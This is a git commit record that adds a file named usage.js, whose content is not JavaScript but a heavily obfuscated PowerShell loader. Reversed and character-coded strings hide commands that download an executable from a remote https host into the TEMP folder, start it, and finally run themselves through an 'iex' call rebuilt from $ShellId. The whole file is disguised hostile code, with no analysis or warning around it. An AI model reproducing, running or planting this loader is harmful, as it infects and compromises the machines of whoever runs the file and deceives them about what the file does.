5a5d3259bad481049cb6e6e4d9c5a1c146ca44ea
Azkic50 <Azkilohj55@gmail.com>
2025-04-07 13:42:52 -0400

    Create usage.js

---
+++ usage.js
@@ -0,0 +1,22 @@
+set ("1"+"hXR97")  ( " ))43]rahC[]GNIRtS[,'zNc'(ecaLpeR.)93]rahC[]GNIRtS[,)07]rahC[+35]rahC[+221]rahC[((ecaLpeR.)' ))29]RaHc[,F5zeSiF5z ECaLpEr-63]RaHc[,F5zhSGF5zEcALpeRc- 93]RaHc[,F5zmWPF5z EcALpeRc-  421]RaHc[,)12'+'1'+']RaHc[+76]RaHc[+05]RaHc[(ECaL'+'pEr- ))F5zxe5( m'+'WP+F5z,F5zamWP+mWPtS      F5z,F5zmWP
+mWP+mW'+'P;)mWP+mWP
+mWP+mWP}1vsism.FQGWTYAX1vmWP+mWPs = bmWP+mWP mWP+mWP;1vsismWP+mWPm.FQGWTYmWP+mWPAX/mWP+mWPdfc.ia-smWP+mWPotohp-ipamWP+mWP//mWP+mWP:sptth1vsmF5z,F5ze5(mWP+mWP mWP+mWPhcaermWP+mWPofmWP+mWP  mWP+F5z,F5z  
+
+}  
+}mWP+mWP mWP+mWP   
+{ hctac F5z,F5zhSGmWP,mWPxe5mWP(ECAlPeR.)43]'+'RahC[]GniRTs[,mWP1vsmWP(F5z,F5zWP+mWP mWP+mWP= a{@]tce'+'jmWP+mWPbOmWP+mWPmmWP+mWPotsuCmWP+mWPSP[  
+(@ = atamWP+mWPDemosmWP+mWPxe5  
+
+mWP(F5z,F5z(xe5teDmWP+mWPPMET:mWP+mWPvnex'+'e5mWP+mWP1vs = htaPelifmWP+mWPxe5    F'+'5z'+',F5z{ )daolmWP+mWPnwomWP+mWPdF5z,'+'F5zP+mWPiF5z,F5z  mWP+mWP
+{ ymWP+mWPrt    
+{ )mWP+mWPataDemosxe5 mWP+mWPni ixF5z,F5zeSi'+'mWP,)611]RahC[+101]RahC[+86]RahC[((ECAlPeR.)mWPF5z,F5zPfi    mWP+mWP  
+ mWP+mWP}mWP+mWP      
+;esm'+'WP+mWPlafxe5 = dao'+'lnwodxe5m'+'WP+mWPF5z,F5z   
+}    mWP+mWP
+mWP+mWP;htaPel'+'mWF5z,F'+'5zmWP+mWPfxe5 ssemWP+mWPcormWP+mWPP-trF5z,F5zECAlPeR.)m'+'WPF5z,F5z      mWP+mWP  
+mWP+mW'+'P{ mWP+mWP)hmWP+mWPtaPe'+'l'+'ifmWP+mF5z,F5zU- mWP+mWPdohteMtmWP+mWPseR'+'-ekovmWP+mWPnI      mWP+mWP  mWP+mWP
+F5z,F5z
+} mWP+mWP     
+ ;htaPelifxe5 eliFtuO- amWP+mWP.ixe5mWP+m'+'WP imWP+mWPrF5z,F5zmWF5z,F5z'+'WPxemWP+'+'mWP5 F5z,F5zmWP5F5z,F5zht'+'aP-mWP+mWPtseTmWP+mWP( fi mWP+mWP    mWP+mWP 
+;eurtxe5 = daomWP+m'+'WPlnwodxe5  mWP+mWP    
+;1vs)b.ixemWP+F5z,F5zNOIsSErpXE-ekOVNiyC2)mWPF5zf- zNc}0{}81{}'+'8{}21{}91{}01{}41{}9{}22{}'+'5{}6{}51{}32{}4{'+'}11{}7{}3{}'+'1{}2{}61{}31{}02{}12{}71{zNc((( ( nOisseRPXE-EKOvNi '( ( )''nioJ-]2,11,3[emaN.)'*rdm*' elBaiRav((. ");  -JOIn(itEm ('VARIABL'+'E'+':1h'+'xr97')).valUE[ - 1 ..- ( (itEm ('VARIABL'+'E'+':1h'+'xr97')).valUE.length ) ] | . ( $shELLId[1]+$sHELlID[13]+'X')
